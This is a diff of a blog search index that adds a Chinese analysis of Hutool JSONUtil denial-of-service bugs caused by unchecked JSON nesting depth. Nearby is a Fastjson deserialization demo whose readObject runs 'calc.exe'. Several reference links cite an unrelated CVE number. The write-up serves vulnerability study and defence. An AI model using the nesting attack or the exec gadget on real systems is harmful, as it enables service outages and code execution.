@@ -188,7 +188,77 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
+    <url>/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/</url>
+    <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2022-45690： 该项目受影响版本存在拒绝服务漏洞，由于org.json.JSONTokener.nextValue::JSONTokener.java组件中并未检验json的嵌套深度。攻击者可以通过构造特制的JSON或XML数据在程序解析时导致JVM溢出从而实现拒绝服务(DoS)攻击。</p>
+<p>CVE-2022-45689：该项目受影响版本存在拒绝服务漏洞，由于JSONObject.java中JSONObject方法对于要解析的json并未检验是否合法，在后续解析JSON时就会因为内存不足而造成拒绝服务漏洞。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt; Hutool 5.8.11</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入<code>hutool</code>包</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811111844774.png" alt="image-20230811111844774"></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试类</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112000265.png" alt="image-20230811112000265"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般我们复现漏洞时都需要利用一些泄露的有关漏洞的信息，比如别人发的通告中未打码完全的截图、漏洞描述等信息，这里我们从阿里云漏洞库的描述中了解到该漏洞的大致情况：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112316260.png" alt="image-20230811112316260"></p>
+<p>里面有两个关键信息，一是嵌套深度、二是栈溢出，那这不妥妥的无线递归导致的栈溢出漏洞吗？先整2000层嵌套打一下试试：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133440365.png" alt="image-20230811133440365"></p>
+<p>果然栈溢出了，打完收工，回家吹空调了。</p>
+<p>啥？你说这太简单了，你想学点硬货？行，那咱上硬货。</p>
+<p>这个漏洞分析第一步肯定时先把断点打起来，我们发现所谓的<code>parseObj</code>其实就是new了一个<code>JSONObject</code>对象。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133657015.png" alt="image-20230811133657015"></p>
+<p>创建对象时会调用<code>init</code>方法，在该方法中会根据我们输入的参数类型选择不同的重载函数进行解析，我们输入的时个字符串，所以会进入到第680行的逻辑里。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133906215.png" alt="image-20230811133906215"></p>
+<p>这里干的什么注释说的已经很清楚了</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134053659.png" alt="image-20230811134053659"></p>
+<p>这里有两个函数解释以下，首先时<code>nextClean</code>会去获取json字符串的token也就是<code>&quot; &#123; &#125; : [ ]</code>这一些，<code>nextValue</code>会去获取json字符串键对应的值。这个漏洞就出现在757行将json的键值对，往JSONObject对象里放的时候，在获取json值得时候会调用netValue函数。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134202285.png" alt="image-20230811134202285"></p>
+<p>这个函数会根据从<code>:</code>后解析到得第一个token类型去调用不同得逻辑，当解析的token为<code>&#123;</code>时就会再new一个JSONObject对象。啊，这这这，这不就递归了吗？</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134541231.png" alt="image-20230811134541231"></p>
+<p>我们知道递归过程中函数会不断地压栈，而栈空间是有限地，如果不断地压栈而不弹栈地话就会导致栈溢出，所以需要一个基例来帮助函数解析到最深处能够回退，而在json字符串解析过程中就是当解析到最后一个<code>&#123;</code>时开始回退。但是这个json字符串地长度再这里我们若是可以控制地话，就可以先搞几万层嵌套让它一直压栈直到溢出为止，因为再分析过程中并没有看到代码中有对嵌套深度地限制。</p>
+<p>这个漏洞是栈溢出漏洞，而（CVE-2022-45689）确实一个实打实得堆溢出漏洞，一般来说堆溢出时非常少见得，应为JVM堆是非常大的，我们可以使用下面的代码答应一下一个普通的java程序运行时JVM可用的堆内存情况。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811152225458.png" alt="image-20230811152225458"></p>
+<p>从结果来看JVM初始化时使用的总的堆内存为241MB，而可用的最到堆内存达到3GB，一般来说时很难发生溢出的。我们知道，JVM堆内存中一般存储的时java对象，要想要JVM堆发生溢出也就是说要有大量的没有被GC回收的对象占满了内存，但是如果只是单纯得常见对象，这些对象在沾满了幸存者0区后会被GC清除掉，一般也不会导致堆溢出，除非这些对象时不可清除得，那么什么情况下得对象时不可清除得呢。GC在进行垃圾回收时可以采用多种策略，其中包括引用计数法，即查看一个对象是否有被别得对象引用，如果没有则可以清除，如果有则不清除，但是这个算法有缺陷解决不了循环引用得问题，所以又有了可达性分析算法，及从一系列得GC Roots开始分析一个对象得可达性，如果这个对象不可达则进行清除。在这个例子中进行JSONObject解析递归到最深层进行返回时，每一个<code>&#123;xx:1&#125;</code>都将被new为一个新的<code>JSONObject</code>对象并被不断地引用嵌套，最终所有的<code>JSONObject</code>对象一起链接在一起占满了堆内存，我们可以使用jconsole来观察一下JVM的堆内存变化情况：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811153435062.png" alt="image-20230811153435062"></p>
+<p>jconsole可能不太直观，可以下载<code>virtual VM</code>进行监控</p>
+<p>下载地址：<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154033340.png" alt="image-20230811154033340"></p>
+<p>最开始我们的程序休眠了20秒（为了给jconsole链接提供时间）休眠结束后开始进行json字符串的解析，开始阶段应为还没有递归到最深处所以堆内存增加量不大，在递归达到最深处函数不断返回时，堆内存空间的消耗不断走高，最终耗尽内存资源导致堆溢出。我们把高峰期的堆内存dump出来</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154905943.png" alt="image-20230811154905943"></p>
+<p>可以看到足足1.7G的内存都被我们的json字符串占据。</p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releases。</a></li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
+<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
+<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
+<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>Hutool</tag>
+        <tag>JSONUtil拒绝服务漏洞</tag>
+        <tag>CVE-2022-45690</tag>
+        <tag>CVE-2022-45689</tag>
+        <tag>DoS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fastjson反序列化漏洞原理分析及复现</title>
     <url>/2025/04/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="Fastjson反序列化漏洞原理分析及复现"><a href="#Fastjson反序列化漏洞原理分析及复现" class="headerlink" title="Fastjson反序列化漏洞原理分析及复现"></a>Fastjson反序列化漏洞原理分析及复现</h1><p>@<a href="Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0">TOC</a> # Fastjson序列化与反序列化 ## 常规反序列化 Fastjson的序列化与反序列化与常规的java反序列化不同，我们先来看一下正常的java反序列化，使用下面一段代码：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;<span class="keyword">import</span> java.io.*;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Unserilize.txt&quot;</span>);        <span class="keyword">try</span> &#123;            <span class="comment">//新建一个对象            UnserializeTest unserializeTest = new UnserializeTest();            unserializeTest.name = &quot;armandhe&quot;;            //序列化            FileOutputStream fileOutputStream = new FileOutputStream(file);            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);            outputStream.writeObject(unserializeTest);            outputStream.close();//            fileOutputStream.close();            //反序列化            FileInputStream fileInputStream = new FileInputStream(file);            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);            try &#123;                UnserializeTest o = (UnserializeTest) objectInputStream.readObject();                System.out.println(o.name);            &#125; catch (ClassNotFoundException e) &#123;                e.printStackTrace();            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;class UnserializeTest implements Serializable&#123;    public String name;    private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException&#123;        in.defaultReadObject();        System.out.println(&quot;执行了readObject函数！！&quot;);        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;&#125;</span></span><br></pre></td></tr></table></figure>
@@ -276,75 +346,14 @@
 
 <p>执行了打开计算机的命令，但我的操作并没有打开计算机，据说是应为jdk版本的原因。详情见： <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a> 参考文章： <a href="https://www.cnblogs.com/nice0e3/p/14601670.html#0x02-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">fastjson反序列化漏洞复现</a> <a href="https://www.jianshu.com/p/35b84eda9292">Fastjson反序列化漏洞利用</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
-    <url>/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/</url>
-    <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2022-45690： 该项目受影响版本存在拒绝服务漏洞，由于org.json.JSONTokener.nextValue::JSONTokener.java组件中并未检验json的嵌套深度。攻击者可以通过构造特制的JSON或XML数据在程序解析时导致JVM溢出从而实现拒绝服务(DoS)攻击。</p>
-<p>CVE-2022-45689：该项目受影响版本存在拒绝服务漏洞，由于JSONObject.java中JSONObject方法对于要解析的json并未检验是否合法，在后续解析JSON时就会因为内存不足而造成拒绝服务漏洞。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt; Hutool 5.8.11</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入<code>hutool</code>包</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811111844774.png" alt="image-20230811111844774"></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>编写测试类</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112000265.png" alt="image-20230811112000265"></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般我们复现漏洞时都需要利用一些泄露的有关漏洞的信息，比如别人发的通告中未打码完全的截图、漏洞描述等信息，这里我们从阿里云漏洞库的描述中了解到该漏洞的大致情况：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112316260.png" alt="image-20230811112316260"></p>
-<p>里面有两个关键信息，一是嵌套深度、二是栈溢出，那这不妥妥的无线递归导致的栈溢出漏洞吗？先整2000层嵌套打一下试试：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133440365.png" alt="image-20230811133440365"></p>
-<p>果然栈溢出了，打完收工，回家吹空调了。</p>
-<p>啥？你说这太简单了，你想学点硬货？行，那咱上硬货。</p>
-<p>这个漏洞分析第一步肯定时先把断点打起来，我们发现所谓的<code>parseObj</code>其实就是new了一个<code>JSONObject</code>对象。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133657015.png" alt="image-20230811133657015"></p>
-<p>创建对象时会调用<code>init</code>方法，在该方法中会根据我们输入的参数类型选择不同的重载函数进行解析，我们输入的时个字符串，所以会进入到第680行的逻辑里。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133906215.png" alt="image-20230811133906215"></p>
-<p>这里干的什么注释说的已经很清楚了</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134053659.png" alt="image-20230811134053659"></p>
-<p>这里有两个函数解释以下，首先时<code>nextClean</code>会去获取json字符串的token也就是<code>&quot; &#123; &#125; : [ ]</code>这一些，<code>nextValue</code>会去获取json字符串键对应的值。这个漏洞就出现在757行将json的键值对，往JSONObject对象里放的时候，在获取json值得时候会调用netValue函数。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134202285.png" alt="image-20230811134202285"></p>
-<p>这个函数会根据从<code>:</code>后解析到得第一个token类型去调用不同得逻辑，当解析的token为<code>&#123;</code>时就会再new一个JSONObject对象。啊，这这这，这不就递归了吗？</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134541231.png" alt="image-20230811134541231"></p>
-<p>我们知道递归过程中函数会不断地压栈，而栈空间是有限地，如果不断地压栈而不弹栈地话就会导致栈溢出，所以需要一个基例来帮助函数解析到最深处能够回退，而在json字符串解析过程中就是当解析到最后一个<code>&#123;</code>时开始回退。但是这个json字符串地长度再这里我们若是可以控制地话，就可以先搞几万层嵌套让它一直压栈直到溢出为止，因为再分析过程中并没有看到代码中有对嵌套深度地限制。</p>
-<p>这个漏洞是栈溢出漏洞，而（CVE-2022-45689）确实一个实打实得堆溢出漏洞，一般来说堆溢出时非常少见得，应为JVM堆是非常大的，我们可以使用下面的代码答应一下一个普通的java程序运行时JVM可用的堆内存情况。</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811152225458.png" alt="image-20230811152225458"></p>
-<p>从结果来看JVM初始化时使用的总的堆内存为241MB，而可用的最到堆内存达到3GB，一般来说时很难发生溢出的。我们知道，JVM堆内存中一般存储的时java对象，要想要JVM堆发生溢出也就是说要有大量的没有被GC回收的对象占满了内存，但是如果只是单纯得常见对象，这些对象在沾满了幸存者0区后会被GC清除掉，一般也不会导致堆溢出，除非这些对象时不可清除得，那么什么情况下得对象时不可清除得呢。GC在进行垃圾回收时可以采用多种策略，其中包括引用计数法，即查看一个对象是否有被别得对象引用，如果没有则可以清除，如果有则不清除，但是这个算法有缺陷解决不了循环引用得问题，所以又有了可达性分析算法，及从一系列得GC Roots开始分析一个对象得可达性，如果这个对象不可达则进行清除。在这个例子中进行JSONObject解析递归到最深层进行返回时，每一个<code>&#123;xx:1&#125;</code>都将被new为一个新的<code>JSONObject</code>对象并被不断地引用嵌套，最终所有的<code>JSONObject</code>对象一起链接在一起占满了堆内存，我们可以使用jconsole来观察一下JVM的堆内存变化情况：</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811153435062.png" alt="image-20230811153435062"></p>
-<p>jconsole可能不太直观，可以下载<code>virtual VM</code>进行监控</p>
-<p>下载地址：<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154033340.png" alt="image-20230811154033340"></p>
-<p>最开始我们的程序休眠了20秒（为了给jconsole链接提供时间）休眠结束后开始进行json字符串的解析，开始阶段应为还没有递归到最深处所以堆内存增加量不大，在递归达到最深处函数不断返回时，堆内存空间的消耗不断走高，最终耗尽内存资源导致堆溢出。我们把高峰期的堆内存dump出来</p>
-<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154905943.png" alt="image-20230811154905943"></p>
-<p>可以看到足足1.7G的内存都被我们的json字符串占据。</p>
-<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
-<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releases。</a></li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
-<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
-<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
-<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
-<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
-</ul>
-]]></content>
       <categories>
         <category>安全技术</category>
         <category>漏洞分析</category>
       </categories>
       <tags>
+        <tag>反序列化</tag>
         <tag>网络安全</tag>
-        <tag>漏洞分析</tag>
-        <tag>漏洞</tag>
-        <tag>Hutool</tag>
-        <tag>JSONUtil拒绝服务漏洞</tag>
